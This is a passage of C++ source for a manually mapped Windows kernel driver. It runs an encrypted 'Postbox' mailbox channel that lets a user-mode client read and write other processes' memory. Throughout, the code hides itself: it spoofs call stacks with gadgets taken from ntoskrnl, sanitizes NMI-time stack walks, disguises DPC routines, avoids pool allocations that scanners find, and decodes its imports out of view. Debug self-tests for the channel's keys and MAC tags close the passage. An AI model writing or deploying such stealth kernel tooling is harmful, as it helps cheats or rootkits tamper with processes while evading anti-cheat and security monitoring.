    PostboxWipe(&PostboxStatePtr->Cfg, sizeof(PostboxConfig));

    // Separate NX stage. Independent pages only: a pool fallback would leave a
    // 64 KiB 'Ntfs' BigPool entry for the channel lifetime (V-27). Fail closed
    // if the loader did not pass the helpers or the allocation/protection fails.
    PostboxStatePtr->Stage = nullptr;
    PostboxStatePtr->StageIndependent = false;
    if (g_MmAllocateIndependentPages && g_MmSetPageProtection && g_MmFreeIndependentPages)
    {
        PostboxStatePtr->Stage = (uint8_t*) ((FnMmAllocateIndependentPages)
            g_MmAllocateIndependentPages)(StageAllocBytes, 0xFFFFFFFF, 0, 0);
        if (PostboxStatePtr->Stage)
        {
            if (PostboxSetPageProtection(
                    PostboxStatePtr->Stage, StageAllocBytes, 0x04 /* PAGE_READWRITE */))
            {
                PostboxStatePtr->StageIndependent = true;
            }
            else
            {
                PostboxFreeIndependentPages(PostboxStatePtr->Stage, StageAllocBytes);
                PostboxStatePtr->Stage = nullptr;
            }
        }
    }
    if (!PostboxStatePtr->Stage)
    {
        print(ERROR("Postbox: independent-page NX stage unavailable; failing closed"));
        PostboxReleaseProcess();
        PostboxFreeStatePage();
        return false;
    }
    PostboxWipe(PostboxStatePtr->Stage, StageAllocBytes);

#ifdef STACK_SPOOF
    // each spoofed call builds a private stack frame. The old 64 KiB
    // NonPagedPoolNx SBPx block and the state-page shadow arrays are gone; only
    // the nt jump-gadget selector remains.
    {
        const address Nt = GetNtoskrnl();
        if (Nt)
        {
            PostboxNmiFindNt(PostboxStatePtr, Nt);
            g_PostboxShadowJumpGadget = PostboxNmiFindShadowJumpGadget(
                Nt, PostboxStatePtr->NmiSanitize.NtSize);
            // These are stack-spoof gadgets, not NMI-callback state. Publish
            // them even when the NMI sanitizer fails closed, so the worker
            // still takes the shadow epilogue (APC balance + reaper path).
            PostboxStatePtr->NmiSanitize.PopRspRet = PostboxNmiFindPopRspRet(
                Nt, PostboxStatePtr->NmiSanitize.NtSize);
            PostboxStatePtr->NmiSanitize.PopRspRetSkip = PostboxNmiFindPopRspRetSkip(
                Nt, PostboxStatePtr->NmiSanitize.NtSize);
        }
        if (!g_PostboxShadowJumpGadget)
            print(ERROR("Postbox: shadow stack unavailable"));
    }
#endif

#ifdef NMI_SANITIZE
    if (!PostboxNmiSanitizeInit(PostboxStatePtr, ImageBase, ImageSize))
        print(WARN("Postbox: NMI sanitizer inactive"));
#endif
#ifdef STACK_SPOOF
    g_PostboxPopRspRet = PostboxStatePtr->NmiSanitize.PopRspRet;
    g_PostboxPopRspRetSkip = (g_PostboxShadowJumpGadget &&
                              PostboxStatePtr->NmiSanitize.PopRspRetSkip)
                                 ? PostboxStatePtr->NmiSanitize.PopRspRetSkip : 0;
    g_PostboxMmCopyTarget = g_MmCopyVirtualMemory;
#endif

#ifdef POSTBOX_NMI
    // The IDT is not touched at start. The gate is installed transiently only for
    // the pb_nmi self-test, then the Windows IDT is restored in the same work item.
#endif

    // The KFWk context is the second page of the state allocation. There is no
    // separate pool block and no state-page pointer: PostboxCtx(State) derives
    // it at State+0x1000.
    {
        auto* Ctx = PostboxCtx(PostboxStatePtr);
        __builtin_memset(Ctx, 0, sizeof(*Ctx));
#ifndef POSTBOX_EVENT_START
        Ctx->Entry = (uint64_t) (uintptr_t) &PostboxWorkEntry;
#endif
        Ctx->Process = PostboxStatePtr->Process;
        Ctx->Stage = PostboxStatePtr->Stage;
        Ctx->StageIndependent = PostboxStatePtr->StageIndependent ? 1 : 0;
        Ctx->ImportBase = PostboxStatePtr->ImportBase;
        PostboxStatePtr->Process = nullptr;
        PostboxStatePtr->Stage = nullptr;
        PostboxStatePtr->StageIndependent = false;
        PostboxStatePtr->ImportBase = 0;
    }

#ifndef POSTBOX_EVENT_START
    PostboxInitializeTimer(&PostboxCtx(PostboxStatePtr)->Timer, 0);   // NotificationTimer
    // PostboxInstallDpcSpoof replaces these fields with the real nt DPC
    // function and the context after it finds them.
    PostboxInitializeDpc(&PostboxCtx(PostboxStatePtr)->Dpc, nullptr, nullptr);
#endif
#ifndef POSTBOX_EVENT_START
#if defined(STACK_SPOOF) && defined(NMI_SANITIZE)
    // Must run after KeInitializeDpc: that call overwrites DeferredRoutine and
    // DeferredContext. The install only rewrites those two fields; the timer is
    // armed afterwards through the normal path. A missing function-entry
    // gadget fails the start closed instead of exposing mapped/mid-function
    // targets in KDPC/WORK_QUEUE_ITEM.
    if (!PostboxInstallDpcSpoof(PostboxStatePtr))
    {
        PostboxCancel();
        PostboxFreeStage();
        PostboxReleaseProcess();
        PostboxFreeStatePage();
        return false;
    }
#ifndef NMI_PROBE
    // Gadget discovery and the process/module layout checks are complete.
    // ImportBase now lives in the KFWk block; the nt base/size and the cache
    // copy are not needed after start when the mapped callback path is disabled.
    PostboxStatePtr->NmiSanitize.NtBase = 0;
    PostboxStatePtr->NmiSanitize.NtSize = 0;
    PostboxWipe(&PostboxStatePtr->Caches, sizeof(PostboxStatePtr->Caches));
#endif
#endif
#endif

    PostboxPeriodMs = 4;
    PostboxIdleMs = 0;
    PostboxDeadTicks = 0;
    __atomic_store_n(&PostboxRunning, 1, __ATOMIC_RELEASE);
#ifdef POSTBOX_EVENT_START
    PostboxPeriodMs = 1000;
    PostboxIdleMs = 0;
    PostboxDeadTicks = 0;
    if (!PostboxStartEventAtStart())
    {
        print(ERROR("Postbox: event thread start failed"));
        __atomic_store_n(&PostboxRunning, 0, __ATOMIC_RELEASE);
        PostboxCancel();
        PostboxFreeStage();
        PostboxReleaseProcess();
        PostboxFreeStatePage();
        return false;
    }
#else
    if (!PostboxArm(4, 1))
    {
        // A start without an armed timer is a resident channel-less image. Fail
        // closed and let the loader free/zero the image.
        print(ERROR("Postbox: KeSetCoalescableTimer failed; start aborted"));
        __atomic_store_n(&PostboxRunning, 0, __ATOMIC_RELEASE);
        // The timer/DPC were initialized just above; cancel and flush before the
        // state page that contains them is freed, even if the arm call queued one.
        PostboxCancel();
        PostboxFreeStage();
        PostboxReleaseProcess();
        PostboxFreeStatePage();
        return false;
    }
#endif

#ifdef NMI_SANITIZE
    // The mailbox worker owns detector refresh and monitor re-registration now.
    // Deadline 0 makes the first worker pass refresh immediately.
    PostboxStatePtr->NmiSanitize.RefreshDeadline = 0;
#endif

#ifdef POSTBOX_EVENT_START
    print(INFO("Postbox: live, event thread 1000 ms, pid %u mailbox %p"),
          MailboxPid, (void*) (uintptr_t) PostboxStatePtr->MailboxVa);
#else
    print(INFO("Postbox: live, 4 ms timer, pid %u mailbox %p"),
          MailboxPid, (void*) (uintptr_t) PostboxStatePtr->MailboxVa);
#endif
    return true;
}

// Wait up to 1 s for the detached work item to clear PostboxInFlight. False
// means the worker is still in flight and the whole state must stay resident.
static bool PostboxWaitForWorker()
{
    for (uint32_t i = 0; i < 1000 && __atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE); ++i)
    {
        _LARGE_INTEGER Interval{};
        Interval.QuadPart = -10000;                 // 1 ms
        PostboxDelayExecutionThread(0, 0, &Interval);
    }
    if (__atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE) != 0)
    {
        print(ERROR("Postbox: worker still in flight; leaving state resident"));
        return false;
    }
    return true;
}

// External teardown (DriverExit / SCM unload). PASSIVE_LEVEL. A manual map has no unload
// callback, so the client's op_stop is the path that matters there.
void PostboxStop()
{
#ifdef POSTBOX_NMI
    // Also covers a second stop after the timer was already cancelled.
    PostboxNmiUninstall();
#endif
    // One teardown owner. A concurrent second stop must not free the state page
    // under the first one; it returns and lets the owner finish.
    if (__atomic_exchange_n(&PostboxTeardown, 1, __ATOMIC_ACQ_REL) != 0)
        return;

#ifdef STACK_SPOOF
    // The stop thread has no worker r15 shadow top; use direct wrappers from
    // here. Any in-flight worker shadow call still returns through its own
    // trampoline.
    __atomic_store_n(&g_PostboxShadowActive, 0, __ATOMIC_RELEASE);
#endif

    if (!__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE))
    {
        if (!PostboxWaitForWorker())
        {
            __atomic_store_n(&PostboxTeardown, 0, __ATOMIC_RELEASE);
            return;
        }
        // A worker that passed the Running check just before the watchdog/stop
        // may have re-armed the timer after the first cancel. Cancel/flush again
        // before releasing the state page.
        if (PostboxStatePtr)
        {
            PostboxCancelTimer(&PostboxCtx(PostboxStatePtr)->Timer);
            PostboxFlushQueuedDpcs();
        }
        PostboxReleaseProcess();
        if (!PostboxStartReaper())
            PostboxFreeStatePage();
        __atomic_store_n(&PostboxTeardown, 0, __ATOMIC_RELEASE);
        return;
    }

    PostboxCancel();

    // The work item is not tracked by KeFlushQueuedDpcs; give it up to 1 s to finish.
    // A worker that passed the Running check just before PostboxCancel may have
    // re-armed the timer after the first cancel. If it is still in flight, leave
    // the whole state resident; its terminal path owns teardown.
    if (!PostboxWaitForWorker())
    {
        __atomic_store_n(&PostboxTeardown, 0, __ATOMIC_RELEASE);
        return;
    }

    // Quiesced: cancel/flush again to cover the re-arm window, then release.
    PostboxCancelTimer(&PostboxCtx(PostboxStatePtr)->Timer);
    PostboxFlushQueuedDpcs();
    PostboxFreeStage();
    PostboxReleaseProcess();
    PostboxFreeState();
    if (!PostboxStartReaper())
        PostboxFreeStatePage();
    print(INFO("Postbox: stopped"));
    __atomic_store_n(&PostboxTeardown, 0, __ATOMIC_RELEASE);
}

#ifdef DEBUG
// ---------------------------------------------------------------------------
// Debug-only kernel self-tests (DriverEntry step 6.5, after PostboxStart).
// Release builds compile these out; both the calls and the functions vanish.
//
// These cover the kernel-only state/auth paths the host suite cannot execute:
//   * VerifyPostboxStateWipe   - start consumed and wiped the config copy, the
//                                derived keys are live, the state page owns the
//                                stage/imports, and PostboxWipe is an all-byte
//                                volatile wipe.
//   * VerifyPostboxRequestAuth - the live keys/session accept a correctly
//                                sealed request and reject every tamper, using
//                                the same MacRequestTag/OpenRequestHeader path
//                                PostboxPollAttached uses.
//   * VerifyPostboxRespondTag  - a response tag built the way PostboxRespond
//                                builds it verifies client-side, and covers
//                                status/ack/body.
// ---------------------------------------------------------------------------

static bool PostboxSelfTestBytesZero(const void* Data, size_t Size)
{
    const volatile uint8_t* p = (const volatile uint8_t*) Data;
    while (Size--)
        if (*p++) return false;
    return true;
}

bool VerifyPostboxStateWipe()
{
    if (!PostboxStatePtr)
    {
        print(ERROR("VerifyPostboxStateWipe: no state page"));
        return false;
    }

    bool Ok = true;

    // PostboxStart consumed Pid/CreateTime and wiped the whole config copy.
    if (!PostboxSelfTestBytesZero(&PostboxStatePtr->Cfg, sizeof(PostboxConfig)))
    {
        print(ERROR("VerifyPostboxStateWipe: config copy is still resident"));
        Ok = false;
    }

    // The masked key schedule must be present and non-zero: an all-zero blob
    // would make every MAC forgeable after unmasking, and DerivePostboxKeys
    // must have wiped its master.
    bool KeyNonZero = false;
    const uint8_t* Keys = (const uint8_t*) &PostboxStatePtr->Keys;
    for (uint32_t i = 0; i < sizeof(PostboxStatePtr->Keys); ++i)
        KeyNonZero |= (Keys[i] != 0);
    if (!KeyNonZero)
    {
        print(ERROR("VerifyPostboxStateWipe: derived keys are all zero"));
        Ok = false;
    }

    if (!PostboxStatePtr->SessionId || !PostboxStatePtr->MailboxVa ||
        !PostboxCtx(PostboxStatePtr) || !PostboxCtx(PostboxStatePtr)->Stage ||
        !PostboxCtx(PostboxStatePtr)->Process)
    {
        print(ERROR("VerifyPostboxStateWipe: start state incomplete"));
        Ok = false;
    }
    // #8: the live stage/process/import-base pointers must not remain in the
    // state page; ImportBase lives in the KFWk block with them.
    if (PostboxStatePtr->Stage || PostboxStatePtr->Process ||
        PostboxStatePtr->ImportBase)
    {
        print(ERROR("VerifyPostboxStateWipe: state-page anchors still set"));
        Ok = false;
    }
    if (!PostboxCtx(PostboxStatePtr) || !PostboxCtx(PostboxStatePtr)->ImportBase)
    {
        print(ERROR("VerifyPostboxStateWipe: import base missing from KFWk"));
        Ok = false;
    }
    if (!PostboxStatePtr->Imports.MmCopyVirtualMemory ||
        !PostboxStatePtr->Imports.PsLookupProcessByProcessId ||
        !PostboxStatePtr->Imports.ExAllocatePoolWithTag ||
        !PostboxStatePtr->Imports.ExFreePool ||
        !PostboxStatePtr->Imports.MmFreeIndependentPages)
    {
        print(ERROR("VerifyPostboxStateWipe: import table incomplete"));
        Ok = false;
    }

    // PostboxWipe must zero every byte (volatile; not elidable) and accept null.
    uint8_t Scratch[64];
    for (uint32_t i = 0; i < sizeof(Scratch); ++i)
        Scratch[i] = 0xA5;
    PostboxWipe(Scratch, sizeof(Scratch));
    if (!PostboxSelfTestBytesZero(Scratch, sizeof(Scratch)))
    {
        print(ERROR("VerifyPostboxStateWipe: PostboxWipe left bytes"));
        Ok = false;
    }
    PostboxWipe(nullptr, sizeof(Scratch));       // must be a no-op

    return Ok;
}

bool VerifyPostboxRequestAuth()
{
    if (!PostboxStatePtr) return false;

    bool Ok = true;
    pb::PostboxKeys Keys = PostboxStatePtr->Keys;      // stack copy, wiped below
    const uint64_t SessionId = PostboxStatePtr->SessionId;
    pb::MaskPostboxKeys(&Keys, SessionId);             // resident copy is masked
    const uint64_t Nonce = 0x1122334455667788ull;
    const uint32_t Seq = 1;

    uint8_t Body[0x40];
    uint8_t PlainBody[sizeof(Body)];
    for (uint32_t i = 0; i < sizeof(Body); ++i)
        Body[i] = PlainBody[i] = (uint8_t) (i * 7 + 1);

    if (!pb::SealRequestBody(Body, sizeof(Body), Keys, SessionId, Nonce))
    {
        print(ERROR("VerifyPostboxRequestAuth: body seal failed"));
        PostboxWipe(&Keys, sizeof(Keys));
        return false;
    }

    PostboxHeader Header{};
    pb::HeaderSetSeq((uint8_t*) &Header, Seq);
    Header.Op = pb_write;
    Header.Pid = 1234;
    Header.Size = sizeof(Body);
    Header.Address = 0x700000001000ull;
    pb::HeaderSetNonce64((uint8_t*) &Header, Nonce);
    pb::HeaderSetSessionId((uint8_t*) &Header, SessionId);
    if (!pb::SealRequestHeader((uint8_t*) &Header, Keys, SessionId, Nonce))
    {
        print(ERROR("VerifyPostboxRequestAuth: header seal failed"));
        PostboxWipe(&Keys, sizeof(Keys));
        PostboxWipe(Body, sizeof(Body));
        return false;
    }

    uint8_t Tag[16];
    pb::MacRequestTag(Tag, Keys, SessionId, Seq, Nonce, pb_write,
                      (const uint8_t*) &Header, Body, sizeof(Body));

    // The poll recomputes exactly this tag and compares with Mac128Equal.
    uint8_t Check[16];
    pb::MacRequestTag(Check, Keys, SessionId, Seq, Nonce, pb_write,
                      (const uint8_t*) &Header, Body, sizeof(Body));
    if (!pb::Mac128Equal(Tag, Check))
    {
        print(ERROR("VerifyPostboxRequestAuth: request tag not stable"));
        Ok = false;
    }

    // The sealed header opens back to the wire values the poll acts on.
    PostboxHeader Opened = Header;
    if (!pb::OpenRequestHeader((uint8_t*) &Opened, Keys, SessionId, Nonce) ||
        Opened.Op != pb_write || Opened.Pid != 1234 ||
        Opened.Size != sizeof(Body) || Opened.Address != 0x700000001000ull)
    {
        print(ERROR("VerifyPostboxRequestAuth: header open mismatch"));
        Ok = false;
    }
    uint8_t OpenedBody[sizeof(Body)];
    for (uint32_t i = 0; i < sizeof(Body); ++i)
        OpenedBody[i] = Body[i];
    if (!pb::OpenRequestBody(OpenedBody, sizeof(OpenedBody), Keys, SessionId, Nonce) ||
        !BytesEqual(OpenedBody, PlainBody, sizeof(Body)))
    {
        print(ERROR("VerifyPostboxRequestAuth: body open mismatch"));
        Ok = false;
    }

    // Tampered body ciphertext -> different tag.
    uint8_t Tampered[sizeof(Body)];
    for (uint32_t i = 0; i < sizeof(Body); ++i)
        Tampered[i] = Body[i];
    Tampered[3] ^= 0x01;
    pb::MacRequestTag(Check, Keys, SessionId, Seq, Nonce, pb_write,
                      (const uint8_t*) &Header, Tampered, sizeof(Tampered));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: tampered body accepted"));
        Ok = false;
    }

    // Tampered sealed header -> different tag.
    PostboxHeader TamperedHeader = Header;
    ((uint8_t*) &TamperedHeader)[pb::kHeaderCipherOffset + 4] ^= 0x80;
    pb::MacRequestTag(Check, Keys, SessionId, Seq, Nonce, pb_write,
                      (const uint8_t*) &TamperedHeader, Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: tampered header accepted"));
        Ok = false;
    }

    // Wrong session / sequence / nonce -> different tag.
    pb::MacRequestTag(Check, Keys, SessionId + 1, Seq, Nonce, pb_write,
                      (const uint8_t*) &Header, Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: wrong session accepted"));
        Ok = false;
    }
    pb::MacRequestTag(Check, Keys, SessionId, Seq + 1, Nonce, pb_write,
                      (const uint8_t*) &Header, Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: wrong sequence accepted"));
        Ok = false;
    }
    pb::MacRequestTag(Check, Keys, SessionId, Seq, Nonce + 1, pb_write,
                      (const uint8_t*) &Header, Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: wrong nonce accepted"));
        Ok = false;
    }

    // A read request does not cover the body: a different body yields the same
    // tag, and the read tag differs from the write tag.
    uint8_t ReadA[16];
    uint8_t ReadB[16];
    pb::MacRequestTag(ReadA, Keys, SessionId, Seq, Nonce, pb_read,
                      (const uint8_t*) &Header, Body, sizeof(Body));
    pb::MacRequestTag(ReadB, Keys, SessionId, Seq, Nonce, pb_read,
                      (const uint8_t*) &Header, Tampered, sizeof(Tampered));
    if (!pb::Mac128Equal(ReadA, ReadB))
    {
        print(ERROR("VerifyPostboxRequestAuth: read tag covers the body"));
        Ok = false;
    }
    if (pb::Mac128Equal(ReadA, Tag))
    {
        print(ERROR("VerifyPostboxRequestAuth: read and write tags collide"));
        Ok = false;
    }

    // Poll sequence arithmetic: accept only Ahead == 1, and the uint32
    // subtraction must wrap (LastSeq = 0xFFFFFFFF, Seq = 0 -> ahead 1).
    if ((int32_t) (1u - 0u) != 1 || (int32_t) (0u - 0xFFFFFFFFu) != 1 ||
        (int32_t) (2u - 0u) == 1)
    {
        print(ERROR("VerifyPostboxRequestAuth: sequence arithmetic changed"));
        Ok = false;
    }

    PostboxWipe(&Keys, sizeof(Keys));
    PostboxWipe(&Header, sizeof(Header));
    PostboxWipe(&Opened, sizeof(Opened));
    PostboxWipe(&TamperedHeader, sizeof(TamperedHeader));
    PostboxWipe(Body, sizeof(Body));
    PostboxWipe(PlainBody, sizeof(PlainBody));
    PostboxWipe(OpenedBody, sizeof(OpenedBody));
    PostboxWipe(Tampered, sizeof(Tampered));
    PostboxWipe(Tag, sizeof(Tag));
    PostboxWipe(Check, sizeof(Check));
    PostboxWipe(ReadA, sizeof(ReadA));
    PostboxWipe(ReadB, sizeof(ReadB));
    return Ok;
}

bool VerifyPostboxRespondTag()
{
    if (!PostboxStatePtr) return false;

    bool Ok = true;
    pb::PostboxKeys Keys = PostboxStatePtr->Keys;      // stack copy, wiped below
    const uint64_t SessionId = PostboxStatePtr->SessionId;
    pb::MaskPostboxKeys(&Keys, SessionId);             // resident copy is masked
    const uint64_t Nonce = 0x8877665544332211ull;
    const uint32_t Seq = 2;
    const int32_t Status = 0;
    const uint32_t RequestOp = pb_read;
    uint8_t Body[8] = {1, 2, 3, 4, 5, 6, 7, 8};

    // PostboxRespond publishes Seq/Ack/Status/Nonce/Mac/SessionId; the tag is
    // MacResponseTag over (Seq, Seq, Status, Nonce, RequestOp, Header, Body).
    PostboxHeader Response{};
    pb::HeaderSetSeq((uint8_t*) &Response, Seq);
    pb::HeaderSetAck((uint8_t*) &Response, Seq);
    pb::HeaderSetStatus((uint8_t*) &Response, Status);
    pb::HeaderSetNonce64((uint8_t*) &Response, Nonce);
    pb::HeaderSetSessionId((uint8_t*) &Response, SessionId);

    uint8_t Tag[16];
    pb::MacResponseTag(Tag, Keys, SessionId, Seq, Seq, Status, Nonce, RequestOp,
                       reinterpret_cast<const uint8_t*>(&Response), Body, sizeof(Body));
    pb::HeaderSetMac((uint8_t*) &Response, Tag);

    // Client-side verification recomputes from the published header fields.
    uint8_t Client[16];
    pb::MacResponseTag(Client, Keys, SessionId,
                       pb::HeaderSeq((const uint8_t*) &Response),
                       pb::HeaderAck((const uint8_t*) &Response),
                       pb::HeaderStatus((const uint8_t*) &Response),
                       pb::HeaderNonce64((const uint8_t*) &Response),
                       RequestOp, reinterpret_cast<const uint8_t*>(&Response),
                       Body, sizeof(Body));
    if (!pb::Mac128Equal(Tag, Client))
    {
        print(ERROR("VerifyPostboxRespondTag: response tag does not verify"));
        Ok = false;
    }
    if (pb::HeaderAck((const uint8_t*) &Response) != Seq)
    {
        print(ERROR("VerifyPostboxRespondTag: Ack != Seq"));
        Ok = false;
    }

    // Status, Ack and the body are covered.
    uint8_t Check[16];
    pb::MacResponseTag(Check, Keys, SessionId, Seq, Seq, (int32_t) 0xC0000005,
                       Nonce, RequestOp, reinterpret_cast<const uint8_t*>(&Response),
                       Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRespondTag: status not covered"));
        Ok = false;
    }
    pb::MacResponseTag(Check, Keys, SessionId, Seq, Seq + 1, Status, Nonce,
                       RequestOp, reinterpret_cast<const uint8_t*>(&Response),
                       Body, sizeof(Body));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRespondTag: ack not covered"));
        Ok = false;
    }
    uint8_t Tampered[sizeof(Body)];
    for (uint32_t i = 0; i < sizeof(Body); ++i)
        Tampered[i] = Body[i];
    Tampered[0] ^= 0x01;
    pb::MacResponseTag(Check, Keys, SessionId, Seq, Seq, Status, Nonce, RequestOp,
                       reinterpret_cast<const uint8_t*>(&Response), Tampered,
                       sizeof(Tampered));
    if (pb::Mac128Equal(Check, Tag))
    {
        print(ERROR("VerifyPostboxRespondTag: body not covered"));
        Ok = false;
    }

    // Request/response domain separation: the same numeric inputs must not
    // produce the same tag in the two directions.
    uint8_t Request[16];
    pb::MacRequestTag(Request, Keys, SessionId, Seq, Nonce, RequestOp,
                      (const uint8_t*) &Response, nullptr, 0);
    if (pb::Mac128Equal(Request, Tag))
    {
        print(ERROR("VerifyPostboxRespondTag: request/response domains collide"));
        Ok = false;
    }

    PostboxWipe(&Keys, sizeof(Keys));
    PostboxWipe(&Response, sizeof(Response));
    PostboxWipe(Body, sizeof(Body));
    PostboxWipe(Tampered, sizeof(Tampered));
    PostboxWipe(Tag, sizeof(Tag));
    PostboxWipe(Client, sizeof(Client));
    PostboxWipe(Check, sizeof(Check));
    PostboxWipe(Request, sizeof(Request));
    return Ok;
}

bool VerifyPostboxResolveNames()
{
    if (!PostboxStatePtr)
    {
        print(ERROR("VerifyPostboxResolveNames: no state page"));
        return false;
    }

    bool Ok = true;
    const PostboxImports& I = PostboxStatePtr->Imports;
    const struct { const char* Name; address Value; } Slots[] = {
        {"KeInitializeTimerEx", I.KeInitializeTimerEx},
        {"KeInitializeDpc", I.KeInitializeDpc},
        {"KeSetCoalescableTimer", I.KeSetCoalescableTimer},
        {"KeCancelTimer", I.KeCancelTimer},
        {"KeFlushQueuedDpcs", I.KeFlushQueuedDpcs},
        {"ExQueueWorkItem", I.ExQueueWorkItem},
        {"PsLookupProcessByProcessId", I.PsLookupProcessByProcessId},
        {"ObDereferenceObject", I.ObDereferenceObject},
        {"KeDelayExecutionThread", I.KeDelayExecutionThread},
        {"PsGetProcessCreateTimeQuadPart", I.PsGetProcessCreateTimeQuadPart},
        {"ExAllocatePoolWithTag", I.ExAllocatePoolWithTag},
        {"ExFreePool", I.ExFreePool},
        {"MmCopyVirtualMemory", I.MmCopyVirtualMemory},
        {"PsGetCurrentProcess", I.PsGetCurrentProcess},
        {"PsAcquireProcessExitSynchronization", I.PsAcquireProcessExitSynchronization},
        {"PsReleaseProcessExitSynchronization", I.PsReleaseProcessExitSynchronization},
#ifdef POSTBOX_KEEP_THREAD_SPOOF
        {"PsCreateSystemThread", I.PsCreateSystemThread},
        {"ZwClose", I.ZwClose},
#endif
        {"MmAllocateIndependentPages", I.MmAllocateIndependentPages},
        {"MmSetPageProtection", I.MmSetPageProtection},
        {"MmFreeIndependentPages", I.MmFreeIndependentPages},
        {"KeEnterCriticalRegion", I.KeEnterCriticalRegion},
        {"KeLeaveCriticalRegion", I.KeLeaveCriticalRegion},
#ifdef POSTBOX_KEEP_THREAD_SPOOF
        {"PsLookupThreadByThreadId", I.PsLookupThreadByThreadId},
#endif
        {"KeQueryInterruptTimePrecise", I.KeQueryInterruptTime},
        {"KeStackAttachProcess", I.KeStackAttachProcess},
        {"KeUnstackDetachProcess", I.KeUnstackDetachProcess},
        {"KeWaitForSingleObject", I.KeWaitForSingleObject},
        {"ObReferenceObjectByHandle", I.ObReferenceObjectByHandle},
        {"PsCreateSystemThread", I.PsCreateSystemThreadEvent},
        {"ZwClose", I.ZwCloseEvent},
        {"ExEventObjectType", I.ExEventObjectType},
        {"PsTerminateSystemThread", I.PsTerminateSystemThread},
    };
    for (const auto& S : Slots)
    {
        if (static_cast<uintptr_t>(S.Value) == 0)
        {
            print(ERROR("VerifyPostboxResolveNames: %s unresolved"), S.Name);
            Ok = false;
        }
    }

    // PostboxResolve decodes each name into a stack buffer and wipes it; a
    // non-null import slot is the proof that every name decoded and resolved.
    return Ok;
}

bool VerifyPostboxStage()
{
    if (!PostboxStatePtr)
    {
        print(ERROR("VerifyPostboxStage: no state page"));
        return false;
    }

    bool Ok = true;
    if (!PostboxCtx(PostboxStatePtr) || !PostboxCtx(PostboxStatePtr)->Stage)
    {
        print(ERROR("VerifyPostboxStage: stage is null"));
        Ok = false;
    }
    if (!PostboxCtx(PostboxStatePtr) || !PostboxCtx(PostboxStatePtr)->StageIndependent)
    {
        print(ERROR("VerifyPostboxStage: stage is not an independent allocation"));
        Ok = false;
    }
    if (!PostboxStatePtr->ReaperBase || !PostboxStatePtr->ReaperSize)
    {
        print(ERROR("VerifyPostboxStage: reaper range is empty"));
        Ok = false;
    }
    if (StageBytes != PostboxDataMax || StageAllocBytes != 0x4000)
    {
        print(ERROR("VerifyPostboxStage: stage size constants changed"));
        Ok = false;
    }
    return Ok;
}

bool VerifyPostboxSelfTest()
{
    bool Ok = true;
    if (!VerifyPostboxStateWipe()) Ok = false;
    if (!VerifyPostboxResolveNames()) Ok = false;
    if (!VerifyPostboxStage()) Ok = false;
    if (!VerifyPostboxRequestAuth()) Ok = false;
    if (!VerifyPostboxRespondTag()) Ok = false;

    if (Ok)
        print(INFO("Postbox: DEBUG self-tests passed"));
    else
        print(ERROR("Postbox: DEBUG self-tests failed"));
    return Ok;
}
#endif

#endif // POSTBOX_CHANNEL
